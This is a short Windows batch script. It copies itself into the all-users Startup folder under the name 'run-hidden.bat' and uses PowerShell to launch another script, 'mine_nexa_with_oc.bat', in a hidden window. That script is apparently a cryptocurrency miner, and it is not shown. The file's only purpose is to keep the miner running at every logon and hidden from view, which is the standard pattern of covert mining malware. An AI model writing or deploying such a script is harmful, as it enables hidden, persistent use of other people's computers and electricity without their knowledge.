@echo off
cd /d %~dp0
copy "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run-hidden.bat"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd -ArgumentList '/c mine_nexa_with_oc.bat' -WindowStyle Hidden"
